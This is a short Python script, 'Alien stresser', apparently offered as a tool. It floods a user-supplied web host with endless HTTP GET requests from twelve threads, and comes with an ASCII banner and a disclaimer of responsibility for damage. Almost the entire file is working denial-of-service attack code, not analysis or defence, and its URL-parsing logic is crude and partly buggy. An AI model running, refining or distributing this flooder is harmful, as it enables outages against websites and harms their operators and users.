
		
"""
Alien stresser is a web-stresser  and HTTP flooder in python .
/!\ Warning : the author isn't responsable for all damage
Author:Had1x
licence : GNU GPL 3
date: 26/03/2016
Requirements:
Python 3
Requests module
requests module installation in (Debian-based distribution):
sudo apt-get install python-pip
pip install requests
Usage :
python3 alien-stresser.py <HOST>
python3 alien-stresser.py http://www.domain.com
"""

import sys
import threading
try:
    import requests
except ImportError:
    print (" please install requests  module with pip n\ -sudo apt-get install python-pip n\ pip install requests n\ ")
    


           
def stresser():
                                                                
    host = sys.argv[1]
    liste  = []
    for elements in host :
        liste.append(elements)
    if (liste[0]) == "w" and (liste[2]) == "w":
        _host_ = "http://" + (host)
    elif (liste[0]) == "h" and (liste[3])  == "p" or (liste[4]) == "p" :
        _host_ =  (host)
    while 1 == 1 :
        w = requests.get(_host_)
        print ("flooding {} ".format(_host_))
          
    

def _threads_():
	 c = threading.Thread(target=stresser)
	 d = threading.Thread(target=stresser)
	 a = threading.Thread(target=stresser)
	 e = threading.Thread(target=stresser)
	 z = threading.Thread(target=stresser)
	 x = threading.Thread(target=stresser)
	 c1 = threading.Thread(target=stresser)
	 d1 = threading.Thread(target=stresser)
	 a1 = threading.Thread(target=stresser)
	 e1 = threading.Thread(target=stresser)
	 z1 = threading.Thread(target=stresser)
	 x1 = threading.Thread(target=stresser)
	 
	 c.start()
	 d.start()
	 a.start()
	 e.start()
	 z.start()
	 x.start()
	 c1.start()
	 d1.start()
	 a1.start()
	 e1.start()
	 z1.start()
	 x1.start()
	
def main():
    if len(sys.argv) != 2 :
     print ("Usage : python Alien-stresser.py  (host) ")
     print ("Example: python  Alien-stresser.py https://www.domain.com ")
    elif len(sys.argv) == 2 :
            print ("""
    
          _ _                _                            
    /\   | (_)              | |                              
   /  \  | |_  ___ _ __  ___| |_ _ __ ___  ___ ___  ___ _ __ 
  / /\ \ | | |/ _ \ '_ \/ __| __| '__/ _ \/ __/ __|/ _ \ '__|
 / ____ \| | |  __/ | | \__ \ |_| | |  __/\__ \__ \  __/ |   
/_/    \_\_|_|\___|_| |_|___/\__|_|  \___||___/___/\___|_|   
                                     (HTTP flooder multi-threaded)
      """)
            
            _threads_()

		
main()
